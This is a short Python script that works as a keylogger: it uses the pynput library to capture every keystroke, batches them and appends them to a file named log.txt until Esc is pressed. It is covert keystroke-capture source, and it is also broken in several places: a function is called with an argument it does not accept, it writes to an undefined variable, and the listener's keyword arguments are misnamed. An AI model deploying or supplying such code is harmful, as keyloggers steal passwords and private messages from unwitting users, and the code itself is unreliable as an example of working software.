import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def onPress(key):
    global keys, count

    keys.append(key)
    count += 1
    #print(key)
    #Doesn't have to be 10
    if(count >= 10):
        count = 0
        writeFile(keys)
        keys = []

def onRelease(key):
    if key == Key.esc:
        return False

def writeFile():
    with open("log.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if(k.find("space") > 0):
                file.write('\n')
            elif(k.find("Key") == -1):
                f.write(k)

with Listener(onPress = onPress, onRelease = onRelease) as listener:
    listener.join()
